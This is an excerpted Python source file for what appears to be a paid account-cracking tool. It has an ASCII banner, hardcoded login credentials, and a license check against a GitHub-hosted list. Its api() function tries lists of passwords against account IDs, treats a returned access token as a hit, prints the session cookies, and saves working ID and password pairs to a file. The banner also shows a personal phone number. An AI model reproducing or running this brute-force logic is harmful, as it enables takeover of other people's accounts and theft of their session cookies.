...
while attemps < 12345677901:
    username = input(' \033[0;31mEnter Username: ')
    password = input(' \033[0;37mEnter Password: ')

    if username == 'Davel-6T9' and password == 'Polash0.002':
...
logo= ("""       
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\033[1;31m║ ____   ___  _        _    ____  _   _       ║
\033[1;32m║|  _ \ / _ \| |      / \  / ___|| | | |      ║
\033[1;37m║| |_) | | | | |     / _ \ \___ \| |_| |      ║
\033[1;32m║|  __/| |_| | |___ / ___ \ ___) |  _  |      ║
\033[1;31m║|_|    \___/|_____/_/   \_|____/|_| |_|      ║
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                       
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING WIFI & MOBILE DATA ]       \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mDavel-4king1 ]\33[1;38m ║\033[1;31m 
╠══[Facebook                 • Md Shimul sha  ║  \033[1;97m  
╠══[Github                   • \33[1;38m4king1         ║\33[1;34m   
╠══[Whatsapp                 • 01725280174    ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/4KING1/polash-ap/blob/main/Apruval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   Davel6T9,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0m║══[7] YOUR KEY : Davel-6T9 :-"+id)
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] DAVEL~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[DAVEL-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/DAVEL-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
